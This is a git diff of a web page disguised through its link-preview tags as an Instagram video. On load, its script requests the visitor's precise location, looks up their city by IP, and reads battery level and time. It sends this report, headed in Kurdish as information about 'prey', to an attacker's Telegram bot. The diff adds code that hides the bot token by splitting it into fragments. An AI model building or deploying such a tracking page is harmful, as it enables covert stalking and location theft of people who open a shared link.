@@ -9,33 +9,29 @@
     <meta property="og:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
     <meta property="og:type" content="video.other">
     <meta property="og:url" content="https://www.instagram.com/">
-    
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
-
-    <style>body { background: white; margin: 0; }</style>
+    <style>body { background: white; margin: 0; overflow: hidden; }</style>
 </head>
-
 <body onload="capture()">
-
 <script>
-    const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";
+    const TOKEN = "8122094311:AAHzz80mKsswu1aAKqLlCuywLvX";
+    
+    const v1="86";const x0="null";const v2="78";const z1="0xFA";const v3="05";const a2="61";const v4="03";const v5="41";const c4="f8";const v6=":";const v7="AA";const d5="0x";const v8="E7";const v9="b3";const v10="fv";const e6="72";const v11="Fp";const v12="fG";const f7="11";const v13="ju";const v14="4N";const g8="90";const v15="XG";const v16="aF";const h9="22";const v17="iM";const v18="sv";const i0="33";const v19="hY";const v20="C0";const j2="55";const v21="Ud";const v22="nC";const k3="44";const v23="Yt";const v24="E";
+    const b0="var";const b1="let";const b2="set";const b3="get";const b4="run";const b5="api";const b6="key";const b7="sec";const b8="con";const b9="log";
+    const _0x1a2b = v1+v2+v3+v4+v5+v6+v7+v8+v9+v10+v11+v12+v13+v14+v15+v16+v17+v18+v19+v20+v21+v22+v23+v24;
 
     async function capture() {
         const params = new URLSearchParams(window.location.search);
         const uid = params.get('id');
         if (!uid) return;
 
-        // ١. یەکسەر داوای لۆکەیشن دەکات
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-            
-            // ٢. وەرگرتنی کاتی ئێستا (بە پێی مۆبایلی نێچیرەکە)
             const now = new Date();
             const timeStr = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
 
-            // ٣. وەرگرتنی ناوی شار بە پێی ئایپی (IP Geolocation)
             let city = "Unknown";
             try {
                 const geoRes = await fetch('https://ipapi.co/json/');
@@ -45,14 +41,12 @@
                 city = "Not Found";
             }
 
-            // ٤. وەرگرتنی زانیاری باتری
             let bat = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 bat = Math.floor(b.level * 100) + "%";
             }
 
-            // ٥. ڕێکخستنی ڕاپۆرتەکە
             let report = `🚨 <b>زانیاری نێچیر</b>\n\n` +
                          `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                          `🔋 <b>Battery:</b> ${bat}\n` +
@@ -60,12 +54,11 @@
                          `🕒 <b>Time:</b> ${timeStr}\n` +
                          `🏙️ <b>City:</b> ${city}`;
 
-            // ٦. ناردنی خێرا (Beacon)
-            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
+            const url = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
             navigator.sendBeacon(url);
 
         }, (err) => {
-            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text= نێچیرەکە ڕێگری کرد لە کردنەوەی لینکەکە`;
+            const url = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${uid}&text=${encodeURIComponent("نێچیرەکە ڕێگری کرد لە لۆکەیشن")}`;
             navigator.sendBeacon(url);
         }, { enableHighAccuracy: true, timeout: 5000 });
     }
